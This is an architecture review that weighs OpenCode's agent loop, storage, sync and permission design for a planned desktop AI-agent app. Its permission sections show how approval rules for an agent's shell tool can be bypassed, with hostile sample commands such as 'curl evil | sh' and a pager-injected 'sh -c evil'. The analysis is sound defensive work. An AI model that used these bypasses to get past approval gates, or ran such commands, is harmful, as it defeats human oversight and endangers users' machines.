# OpenCode 架构研究 — 综述

参考: sst/opencode (克隆于 Downloads/opencode-ref, 只读)。

# OpenCode → DeskMinis: Decision Synthesis

## 1. ADOPT

**M2 — agent loop & storage**
- **Event-sourced session store, now, before memory/skills exist.** `packages/core/src/event/sql.ts`: `event_sequence(aggregate_id PK, seq, owner_id)` + `event(id, aggregate_id, seq, type, data)`, with a projected read model `session_message(id, session_id, seq, data)` (`packages/core/src/session/sql.ts`). Split the event vocabulary into **durable** (persisted, sequenced) vs **live-only deltas** (`packages/schema/src/session-event.ts` exports `DurableDefinitions` without `*.delta`). This one decision buys reconnect, history, multi-window and M3 sync. Retrofitting `seq` after skills/memory events exist is the expensive path.
- **Resumable per-session subscription**: `session.subscribe({sessionID, afterSeq})` — read rows after seq, then a sliding(1) wake channel that re-reads (`packages/core/src/event.ts` `durable`). Keep the global firehose deliberately lossy/bounded.
- **Two-loop runner** (`packages/core/src/session/runner/llm.ts`): outer over queued prompts, inner over steps; `needsContinuation` is set by *arrival of a tool-call event*, not by `finish_reason`. Portable across Anthropic and OpenAI wire formats.
- **Max-steps wrap-up turn** (`packages/core/src/session/runner/max-steps.ts`): on budget exhaustion send one final turn with `tools: []`, `toolChoice: "none"` and a "summarize what you did" message. ~30 lines, big UX win over a truncated transcript.
- **Three-channel tool output** (`packages/core/src/tool/tool.ts`): `output` / `structured` (persisted) / `content` (model-visible). Plus bounded output with spill-to-disk (`packages/core/src/tool-output-store.ts`: `MAX_LINES=2000`, `MAX_BYTES=50KB`, head+tail preview, 7-day retention). Your shell tool hits this first.
- **Two-pass secret redaction before persisting/streaming provider errors** (`packages/llm/src/route/executor.ts`): regex on sensitive field *names*, then literal replacement of the secret *values* the request sent. You persist errors to SQLite and ship them to the renderer — this is where keys leak.
- **HTTP-layer retry outside the loop**: `MAX_RETRIES=2`, 500ms base, 10s cap, ±20% jitter, honors `retry-after-ms`/`retry-after`; tagged error union so the loop only special-cases context-overflow.
- **Compaction** (`packages/core/src/session/compaction.ts`): flatten to text, keep ~8k tokens verbatim, summarize the rest into a fixed Markdown template, re-inject as one `<conversation-checkpoint>` user message. Two triggers (proactive estimate, reactive on overflow), refuse to recover a second overflow.
- **Registry-based tool UI with a good default** (`PART_MAPPING` + `ToolRegistry.register`, generic `mcp` icon fallback) — an unknown MCP tool must render, not crash.
- **Stale-tool-call guard** (`packages/core/src/tool/registry.ts`): registrations carry an `identity`; mismatched calls return `Stale tool call: <name>`. Matters the moment MCP servers appear/disappear between turns.

**M2 — Electron shell**
- `ensureLoopbackNoProxy()` + system-CA merge in the sidecar (`packages/desktop/src/main/sidecar.ts`). Two one-liners that otherwise become unreproducible Windows support tickets.
- Two-phase readiness: `{type:"ready"}` message (60s stall timeout) **then** independent health polling every 100ms racing child exit. "Socket accepted" ≠ "core healthy."
- Renderer persistence via IPC into named `electron-store` instances, not localStorage (`packages/desktop/src/main/store.ts`) — and their warning: never instantiate at module load, import hoisting beats `app.setPath('userData')`.

**M3 — sync**
- **Single-writer event-log shipping, not record merge.** `packages/opencode/src/server/routes/instance/httpapi/groups/sync.ts`: `POST /sync/history` (request body is `{aggregateID: lastKnownSeq}`), `/sync/replay`, `/sync/steal`. Ownership enforced by `event_sequence.owner_id`; replay of a stored seq is accepted only on deep-equality of `{id, versionedType, data}`, else it hard-fails "Replay diverged". Version-stamp event types on the wire (`versionedType(type, version)`) so an old peer fails to recognize rather than mis-decodes. This is a strictly better foundation than PortableRecord diffing — records become a projection.
- Give every window/desktop a stable UUID **now** (`packages/desktop/src/main/windows.ts` per-window `window-state-<id>.json`).
- Define a `PeerConnection` discriminated union (`local | lan:<peerId>`) on day one, mirroring `ServerConnection.Any` (`packages/app/src/context/server.tsx:181`).

**M4 / UI redesign**
- Two-file token layer (primitives `packages/ui/src/v2/styles/colors.css`, semantics `theme.css`), named typography classes (`.text-14-medium`), `data-component`/`data-slot`/`data-variant` CSS contract, `@layer theme, base, components, utilities`.
- Streamed-text pacing (`createPacedValue`, 24ms, whitespace-snapped) + virtualized row-model timeline + `content-visibility: auto`.
- Windows packaging: `nsis`, `oneClick:true`, `perMachine:false`, channel-per-appId so dev/beta/prod coexist.

## 2. AVOID

- **Do not port BashArity.** `packages/opencode/src/permission/arity.ts` — I verified `prefix()` does `tokens.slice(0, arity)` over the **raw** token list including flags, directly violating the generating prompt's own rule ("Flags NEVER count as tokens", visible in the file header comment). Unlisted commands fall through to `tokens.slice(0, 1)`.
- **Do not persist model-authored strings as glob patterns.** Verified: `packages/core/src/tool/bash.ts` calls `permission.assert({action: name, resources: [input.command], save: [input.command]})` — the raw command. `packages/core/src/util/wildcard.ts` then interprets `*`/`?` in it as wildcards with the `s` flag. Approving `git add *` persists a rule matching `git add . ; curl evil | sh`.
- **Do not copy the permissive default.** Verified `{ action: "*", resource: "*", effect: "allow" }` at `packages/core/src/plugin/agent.ts:113` and `"*": "allow"` at `packages/opencode/src/agent/agent.ts:119`. Their entire bash-analysis machinery is dead code out of the box.
- **Do not use blanket `always: ["*"]`** (nine tools do: edit/write/apply_patch/read/glob/grep/webfetch/websearch/task). One "allow always" on a README edit unlocks every file.
- **Do not make permission gating voluntary per-tool.** `specs/v2/tools.md:131` states the registry deliberately injects no helper. That is exactly how MCP tools ended up gated on bare name with `patterns:["*"]` (`packages/opencode/src/session/tools.ts:408`) and how V2's external-directory scan degraded into advisory *warning text* — verified verbatim in `bash.ts`: "this scan is advisory only."
- **Do not put auto-approve in the client.** `--auto`/`--yolo` is TUI/app-side auto-POST of `reply:"once"` (`packages/tui/src/context/sync.tsx:190-200`). Policy in an untrusted, replaceable client is not policy.
- **Do not build the loop on AI SDK `streamText`.** OpenCode's own v1→v2 trajectory is the evidence.
- Don't copy Effect-TS control flow (`Effect.die(TurnTransitionError)` caught by `catchDefect` as a goto), the 2,662-line `message-part.tsx`, dual token systems, or dead framework residue (`[data-tauri-drag-region]` still live in `packages/ui/src/styles/base.css:85`).
- **Don't ship unbounded tool concurrency with no per-tool timeout** — OpenCode has neither; their own TODO admits it.

## 3. VALIDATES

- **minisd-as-sidecar is right.** OpenCode independently landed on: ephemeral loopback port (`listen(0)` then close), per-launch `randomUUID()` secret passed over IPC (never argv/file), `utilityProcess.fork`, explicit CORS allowlist (`oc://renderer`), `contextIsolation:true / nodeIntegration:false / sandbox:true`, single frozen `window.api`. Nearly identical to your M1.
- **Your per-run bearer token is *stronger* than theirs.** OpenCode's auth is one shared Basic password that degrades to *no auth at all* when unset (`packages/server/src/auth.ts` + `middleware/authorization.ts`), so any local process can enumerate and approve pending permission requests. Keep yours.
- **Pure-client renderer** validated: their desktop package is only ~4,500 lines because 100% of UI lives in `packages/app` behind an injected `Platform`.
- **Three-effect permission vocabulary** (`allow`/`ask`/`deny`) with no mode enum, pending-request map + Deferred, and decline-halts-the-loop all match your gateway design.
- Single-drain-per-session concurrency (`packages/core/src/session/run-coordinator.ts`) validates your counted-loop serialization.

## 4. GAPS

- **LAN discovery + pairing + peer auth: no prior art here.** `packages/opencode/src/server/mdns.ts` is 47 lines, publish-only, try/catch-swallowed, refuses loopback. No browse side, no pairing, no TXT capability negotiation, no TLS. M3's harder half must be designed from scratch — budget for it.
- **No sandbox anywhere.** `packages/containers` is CI Docker images. `project.sandboxes` is just extra worktree directories. Their own bash description concedes "host user's filesystem, process, and network authority." Windows defense-in-depth (restricted token / Job Object / AppContainer / low-priv exec user) is unborrowed work.
- **Permission audit log**: only `Effect.logInfo`, no durable queryable decision record. You need one.
- **Approval revocation UI**: V2 persists approvals to SQLite forever with no TTL and no in-app revocation beyond `DELETE /api/permission/saved/:id`.
- **Steer-vs-queue mid-run input** (`session_input` with `delivery` + `admitted_seq`/`promoted_seq` cutoff) — a real UX problem you have no answer for.
- **Snapshot/revert** (`snapshots.capture()`, per-step start/end snapshots) — the reference for M4 workspace sync, unread.
- **Backpressure/overflow signalling**: their bounded queue fails the SSE stream but nothing tells the client it *missed* events. You inherit this problem on WebSocket; the durable+`afterSeq` design is the fix.
- **Per-session provider-retry ceiling**: unchecked TODO in their runner.

## 5. Permission verdict — plainly

**No. OpenCode's model would not survive the bypasses that defeated your heuristic classifier.** It fails the same way, for the same reason, and the failures are verifiable in source:

- `git --no-pager diff` → saved rule `git --no-pager *` → later authorizes `git -c core.pager='sh -c evil' log` and `git push --force`. (`arity.ts` `prefix()` slices raw tokens.)
- `sudo`, `bash`, `eval`, `xargs` are absent from `ARITY` → fallback `tokens.slice(0,1)` → one benign `sudo apt list` saves `sudo *`.
- Redirects are shown in the prompt but erased from the saved pattern (`echo test > out.txt` saves `echo *`), and redirect targets never trigger external-directory checks.
- Name-based classification (`FILES` set at `shell.ts:29-63`) is defeated by `/bin/rm`, `\rm`, `command rm`, `busybox rm`.
- `*` crosses path separators (verified: `.*` under the `s` flag), so an `external_directory` grant of `~/*` is recursive over the whole home tree.
- V2 saves the raw model-authored command string as a glob.

**Implication.** Static command classification is not a security boundary and OpenCode should not be cited as evidence that it can be made one — their V2 rewrite *dropped* the heuristics (three explicit TODOs at `packages/core/src/tool/bash.ts:66-77`) and downgraded the scan to advisory text. Take the correct lesson:

1. **Tree-sitter splitting is for presentation only.** Splitting `a && b` and `$(c)` into separately reviewable units makes the prompt honest (`packages/opencode/test/tool/shell.test.ts:253-260`). Use it to render the UI; never to decide the approval.
2. **The human sees the literal command; the grant is exact-match, not a pattern.** If you persist an approval derived from tool input, store a structured exact-match record or escape the value.
3. **Deny-by-default + mandatory chokepoint.** Keep the gateway in the invocation path so a new tool (and every M2 MCP tool, *with its arguments*) is deny-by-default until it declares policy.
4. **Scope "always" to (project, session) with explicit expiry and a visible revocable list.** V1's session-lifetime approvals are safer than V2's forever-rows.
5. **Two-step "Allow always" showing the exact scope** (`packages/opencode/src/cli/cmd/run/permission.shared.ts`) — note their Electron app skips this (`session-permission-dock.tsx` grants with the scope invisible). Your Vue client is exactly the surface where they got it wrong.
6. **Adopt the cheap non-heuristic wins**: doom-loop detection (identical tool + byte-identical input ×3 → ask, `packages/opencode/src/session/processor.ts:356-378`), capability removal over runtime refusal (`visibleTools()`), and reject-with-feedback (`PermissionCorrectedError`) instead of a binary gate.
7. **M3 caveat**: permission grants are capabilities. Exclude them from LAN sync, or make them device-scoped and re-confirmed on receipt.